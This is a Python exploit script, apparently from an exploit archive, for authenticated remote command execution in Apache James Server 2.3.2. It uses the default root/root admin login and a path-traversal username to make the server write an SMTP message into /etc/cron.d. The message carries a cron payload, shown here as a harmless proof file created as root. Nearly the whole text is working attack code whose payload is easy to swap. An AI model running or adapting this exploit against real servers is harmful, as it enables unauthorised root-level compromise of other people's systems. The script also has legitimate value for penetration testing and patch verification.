#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
payload = b'* * * * * root touch /root/proof.txt'
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print("[+]Connecting to James Remote Administration Tool...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    result=s.recv(1024)
    print(result.decode())
    userstring=user + "\n"
    s.send(userstring.encode("latin1"))
    result=s.recv(1024)
    print(result.decode())
    pwdstring=pwd + "\n"
    s.send(pwdstring.encode("latin1"))
    result=s.recv(1024)
    print(result.decode())
    print("[+]Creating user...")
    s.send(b"adduser ../../../../../../../../etc/cron.d exploit\n")
    result=s.recv(1024)
    print(result.decode())
    s.send(b"quit\n")
    s.close()
except ValueError as e:
	print("The error was", str(e))
except socket.error as e:
	print("The error was", str(e))

try:
    print("[+]Connecting to James SMTP server...")
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    message="HELO team@team.pl\r\n"
    s.send(message.encode("latin1"))
    result=s.recv(1024)
    if result:
	    print(result.decode("latin1"))
    print("[+]Sending payload...")
    message="mail from: <'@team.pl>\r\n"
    s.send(message.encode("latin1"))
    result=s.recv(1024)
    if result:
	    print(result.decode("latin1"))
    # also try s.send("rcpt to: <../../../../../../../../etc/cron.d@hostname>\r\n") if the recipient cannot be found
    message="rcpt to: <../../../../../../../../etc/cron.d>\r\n"
    s.send(message.encode("latin1"))
    result=s.recv(1024)
    if result:
        print(result.decode("latin1"))
    message="DATA\r\n"
    s.send(message.encode("latin1"))
    result=s.recv(1024)
    if result:
	    print(result.decode("latin1"))
    message="From: team@team.pl\r\n"
    s.send(message.encode("latin1"))
    message="\r\n'\n"
    s.send(message.encode("latin1"))
    s.send(payload)
    message="\n\r\n.\r\n"
    s.send(message.encode("latin1"))
    result=s.recv(1024)
    if result:
	    print(result.decode("latin1"))
    message="QUIT\r\n"
    s.send(message.encode("latin1"))
    result=s.recv(1024)
    if result:
	    print(result.decode("latin1"))
    s.close()
    print("[+]Done! Payload will be executed in about 1 minute.")
except ValueError as e:
	print("The error was", str(e))
except socket.error as e:
	print("The error was", str(e))

